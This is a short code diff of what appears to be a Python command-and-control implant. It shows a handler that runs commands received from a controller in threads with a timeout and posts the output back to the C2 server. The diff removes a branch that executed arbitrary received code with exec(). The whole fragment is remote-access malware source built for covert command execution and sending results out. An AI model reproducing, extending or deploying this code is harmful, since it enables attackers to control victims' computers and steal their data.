@@ -152,22 +152,16 @@ def cmd_handler(cmd):
         else:
             #if "-debug" in argv: print("\n[*] Executing: {}".format(cmd))
             tmp = CmdExec()
-            if cmd.startswith("#Module"):
-                t1 = Thread(target=tmp.mod_exec, args=(cmd,))
-                t1.daemon = True
-                t1.start()
-                resp = tmp.cmd
-            else:
-                t1 = Thread(target=tmp.cmd_exec, args=(cmd,))
-                t1.daemon=True
-                t1.start()
-                t2 = Thread(target=cmd_timout, args=(tmp,))
-                t2.daemon = True
-                t2.start()
-                while tmp.running:
-                    sleep(.001)
-                resp = tmp.cmd
-                del(tmp)
+            t1 = Thread(target=tmp.cmd_exec, args=(cmd,))
+            t1.daemon=True
+            t1.start()
+            t2 = Thread(target=cmd_timout, args=(tmp,))
+            t2.daemon = True
+            t2.start()
+            while tmp.running:
+                sleep(.001)
+            resp = tmp.cmd
+            del(tmp)
         # Send data back to C2
         http_request(resp)
     except Exception as e:
@@ -187,13 +181,6 @@ class CmdExec():
         except Exception as e:
             self.cmd = str(e)
         self.running = False
-
-    def mod_exec(self,cmd):
-        try:
-            self.cmd = "[+] Module Executed"
-            exec(cmd)
-        except:
-            self.cmd = str(e)
 
 def cmd_timout(class_obj):
     sleep(120)
